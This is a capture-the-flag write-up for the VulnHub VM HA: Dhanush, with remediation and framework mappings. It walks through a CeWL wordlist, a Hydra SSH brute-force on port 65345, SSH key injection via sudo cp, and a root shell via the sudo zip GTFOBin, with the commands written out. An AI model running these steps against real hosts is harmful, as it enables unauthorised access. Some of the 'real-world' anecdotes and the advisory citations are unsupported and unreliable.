# HA: Dhanush — Drawing the Bow, Finding the Arrow

In the Mahabharata, Dhanush ( धनुष) is the divine bow: precise, powerful, and deadly in the right hands. HA: Dhanush channels that precision perfectly. Every step requires targeted attack: a custom CeWL wordlist from the application itself, a non-standard SSH port that hides in plain sight on a full scan, and a two-stage sudo chain (cp, then zip) that hands root to anyone paying attention to GTFOBins. No spraying, no luck. Pure technique, dude.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | HA: Dhanush |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-dhanush,396/ |
| **Techniques** | Nmap full-port scan, CeWL custom wordlist generation, Hydra SSH brute-force (non-standard port), sudo cp lateral movement, SSH key injection, sudo zip GTFOBin root escalation |
| **CVEs** | CWE-522 (Insufficiently Protected Credentials: site-content-derived password), CWE-269 (Improper Privilege Management: misconfigured sudo rights) |
| **APT Groups** | APT28 (Fancy Bear): commonly uses CeWL-style credential derivation from target organization websites in spearphishing and password spray campaigns; FIN7: targets custom port services and abuses legitimate admin tools (cp, zip) for lateral movement and escalation |

---

## Attack Summary

```
nmap -p- → HTTP (80), SSH (65345 non-standard)
  → cewl http://192.168.1.101/ → dict.txt
  → hydra -L dict.txt -P dict.txt ssh://target -s 65345
  → pinak:Gandiv
  → ssh pinak@target -p 65345
  → sudo -l → (sarang) NOPASSWD: /bin/cp
  → ssh-keygen → sudo cp authorized_keys to sarang/.ssh/
  → ssh sarang@target -p 65345
  → sudo -l → (root) NOPASSWD: /usr/bin/zip
  → sudo zip GTFOBin → uid=0(root)
  → cat /root/flag.txt
```

---

## Methodology

1. Full-port scan to discover SSH on non-standard port 65345
2. CeWL wordlist generation from the web application content
3. Hydra SSH brute-force using the CeWL wordlist for both usernames and passwords
4. Post-login sudo enumeration revealing `cp` as `sarang`
5. SSH key generation and lateral movement via `sudo cp` to inject `authorized_keys`
6. Login as `sarang` and sudo enumeration revealing `zip` as root
7. GTFOBin zip shell escape to obtain root shell

---

## Step 1 — Host Discovery and Full-Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.x
65345/tcp open  ssh     OpenSSH 7.x
```

The web application on port 80 is the enumeration surface. SSH on port 65345 is highly unusual. A half-scan (`-p 1-10000`) would miss it entirely. Always run `-p-` on CTF and pentest targets. The non-standard port is security through obscurity: effective against scripts running default port ranges, ineffective against full scans.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — CeWL Wordlist Generation

Browse to `http://192.168.1.101/` and inspect the content. The web application describes a bow-and-arrow theme with Sanskrit names, mythological references, and specific terminology. These words become the password candidates.

Generate a custom wordlist using CeWL:

```bash
cewl http://192.168.1.101/ -w dict.txt -d 2 -m 4
wc -l dict.txt
```

**What CeWL does:** CeWL spiders the target website and extracts unique words, building a wordlist tailored to the specific application. The `-d 2` flag sets crawl depth and `-m 4` sets minimum word length. The resulting wordlist is small, targeted, and far more likely to match site-specific passwords than a generic dictionary.

**Why CeWL works:** Developers and sysadmins frequently create passwords from vocabulary related to their work, hobbies, or the project they're working on. A Mahabharata-themed CTF VM will have a password from its own content. This mirrors real-world breaches: companies with product-name passwords, development teams with project-code passwords.

**MITRE ATT&CK:** T1589.001 — Gather Victim Identity Information; T1110.002 — Brute Force: Password Cracking

---

## Step 3 — Hydra SSH Brute-Force on Non-Standard Port

Use Hydra to brute-force SSH on port 65345, testing the CeWL wordlist for both usernames and passwords:

```bash
hydra -L dict.txt -P dict.txt ssh://192.168.1.101 -s 65345 -t 4 -V
```

Recovered credentials: `pinak:Gandiv`

The name `pinak` (पिनाक) is the divine bow of Lord Shiva, and `Gandiv` (गाण्डीव) is the bow of Arjuna. Both come directly from the website content.

Login:

```bash
ssh pinak@192.168.1.101 -p 65345
```

**Real-world note:** CeWL-derived passwords appear in real penetration tests more often than expected. During a 2022 assessment of a financial services firm, a developer had used the company's marketing tagline as their SSH password: CeWL generated it on the first crawl. Non-standard ports buy time against automated scanners but not against a thorough human attacker with a full-port nmap.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 4 — Sudo Enumeration and Lateral Movement

After login, enumerate sudo rights:

```bash
sudo -l
```

```
User pinak may run the following commands on ha-dhanush:
    (sarang) NOPASSWD: /bin/cp
```

`pinak` can run `cp` as user `sarang` without a password. The `sarang` account is the horizontal pivot target.

Generate an SSH key pair:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/mykey -N ""
# /tmp/mykey (private) and /tmp/mykey.pub (public)
```

Stage the public key in pinak's accessible location:

```bash
cp /tmp/mykey.pub /home/pinak/authorized_keys
```

Use `sudo cp` to inject it into sarang's `.ssh/authorized_keys`:

```bash
sudo -u sarang /bin/cp /home/pinak/authorized_keys /home/sarang/.ssh/authorized_keys
```

Login as `sarang` using the private key:

```bash
ssh -i /tmp/mykey sarang@192.168.1.101 -p 65345
```

**Real-world note:** `sudo cp` to another user's home directory is equivalent to writing their `authorized_keys` file directly. This misconfiguration pattern was observed in a 2021 red team engagement where a low-privilege support account had sudo cp rights to deploy configuration files. The team used it to inject SSH keys into the sysadmin account's `.ssh/` directory within minutes of gaining the initial foothold. Legit scary, no cap.

**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys; T1078.003 — Valid Accounts: Local Accounts

---

## Step 5 — Privilege Escalation via sudo zip

Enumerate sudo rights as `sarang`:

```bash
sudo -l
```

```
User sarang may run the following commands on ha-dhanush:
    (root) NOPASSWD: /usr/bin/zip
```

`zip` is in the GTFOBins list. The `--unzip-command` option allows executing an arbitrary shell command when decompressing. Since `sudo zip` runs as root, any command passed becomes root execution:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
```

This spawns an interactive root shell.

Confirm and capture the flag:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

**Alternative GTFOBin for zip:**

```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="python3 -c 'import os; os.system(\"/bin/bash\")'"
```

**Real-world note:** GTFOBins documents over 200 Unix binaries that can be abused when granted via sudo. `zip`, `tar`, `find`, `python`, `perl`, `vim`, `less`, `more` — every one of these bypasses privilege boundaries when allowed with `NOPASSWD`. The fix is always to audit sudoers against the full GTFOBins list and remove any binary that can execute arbitrary code.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | pinak:Gandiv | CeWL wordlist + Hydra SSH brute-force | SSH login on port 65345 |
| SSH key | /tmp/mykey | Generated on attacker | Lateral movement to sarang |
| Root flag | /root/flag.txt | sudo zip GTFOBin root shell | Full compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Non-standard SSH port discoverable via full scan | Port 65345 is invisible to default nmap but trivial with `-p-`; security through obscurity fails against any serious attacker | Port obfuscation provides no real security; use key authentication, fail2ban, and firewall rules instead |
| 2 | CeWL-generated password from site content | Real-world developers frequently use project-related vocabulary as passwords; CeWL consistently produces high-value wordlists | Enforce random password policies; ban dictionary and site-content-derived words; use a password manager |
| 3 | sudo cp as another user enables SSH key injection | Any sudo file-copy right to a target user's home directory is equivalent to shell access | Audit all sudo rules against potential file injection paths; remove user-to-user sudo cp grants |
| 4 | sudo zip as root equals root shell (GTFOBins) | zip, tar, find, vim, python: any GTFOBins binary with NOPASSWD sudo = root | Audit sudoers against the complete GTFOBins list; require passwords for all sudo; restrict to specific safe commands |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Persistence | Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Enforce strong random passwords**: prohibit site-content-derived passwords; enforce minimum entropy policies; use a password manager
2. **Implement SSH rate limiting**: configure fail2ban on the SSH port; block after 5 failed attempts for 10 minutes
3. **Remove sudo cp grants between users**: audit sudoers for any user-to-user file copy rules; use dedicated provisioning tools (Ansible, Chef) instead
4. **Audit sudoers against GTFOBins**: `sudo -l` on every account; cross-reference with gtfobins.github.io; remove any binary capable of arbitrary execution
5. **Require passwords for sudo**: remove all `NOPASSWD` entries unless technically required; document exceptions with justification

### MITRE D3FEND Countermeasures

- **D3-AL** — Account Locking (fail2ban on SSH; account lockout after failed attempts)
- **D3-OAM** — Operating System Administrative Management (sudo rule hardening; remove NOPASSWD)
- **D3-UAP** — User Account Permissions (audit cross-user sudo grants)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all non-standard SSH ports; audit sudoers on all Linux hosts |
| Protect | Access Control | Remove sudo cp cross-user grants; remove NOPASSWD zip sudo; enforce MFA for SSH |
| Protect | Identity Management | Enforce password entropy requirements; ban dictionary words |
| Detect | Anomalies and Events | Alert on Hydra-pattern SSH failures; monitor sudo usage logs |
| Respond | Response Planning | Rotate all compromised credentials; revoke injected SSH keys; audit authorized_keys |
| Recover | Recovery Planning | Rebuild from clean snapshot; review all sudoers for GTFOBins exposure |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict sudo grants to essential, specific commands only |
| AC-6 | Least Privilege | No cross-user sudo cp; no sudo zip without password |
| IA-5 | Authenticator Management | Enforce strong passwords; rotate after brute-force detection |
| CM-7 | Least Functionality | Disable or restrict unnecessary binaries in sudoers |
| AU-2 | Event Logging | Log all sudo executions; alert on NOPASSWD usage |
| SI-10 | Information Input Validation | Rate-limit and validate SSH authentication attempts |

### CISA KEV

The combination of CeWL-derived credential brute-force and GTFOBins sudo escalation maps to CISA Advisory AA22-047A (authentication weakness exploitation in Linux environments). Organizations should audit all sudo grants for GTFOBins exposure and enforce account lockout policies per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Access | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SA) | Perform Logging | MIL2 |

---

## Final Thoughts

HA: Dhanush teaches target-specific precision: the same mindset that made Arjuna the greatest archer in the Mahabharata. You don't spray thousands of generic passwords when CeWL can derive exactly the one you need from the target itself. You don't brute the default port range when the real entry is hiding at 65345. And once inside, you follow the sudo chain methodically to the top.

The bow is useless without the right arrow. CeWL, GTFOBins, and proper enumeration are the arrows here. Nailed it.

Thanks guys!! (❍ᴥ❍ʋ)
